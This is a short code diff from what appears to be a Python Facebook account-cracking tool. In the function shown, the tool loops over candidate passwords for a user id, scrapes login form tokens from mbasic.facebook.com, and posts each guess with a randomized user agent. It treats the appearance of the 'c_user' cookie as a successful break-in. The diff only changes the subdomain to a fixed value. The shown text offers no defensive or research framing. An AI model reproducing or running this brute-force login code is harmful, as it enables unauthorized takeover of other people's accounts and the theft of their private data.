@@ -303,7 +303,7 @@ def need(uid,pwx,fb,tl):
     try:
         for ps in pwx:
             uuu=random.choice(ugen)
-            free_fb = session.get(f'https://{fb}.facebook.com').text
+            free_fb = session.get(f'https://mbasic.facebook.com').text
             info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
             update= {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -326,7 +326,7 @@ def need(uid,pwx,fb,tl):
     'user-agent': uuu,
     'viewport-width': '980',
 }
-            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
+            session.post(url=f"https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
             heron_brand=session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
                 hh=str(len(ok))
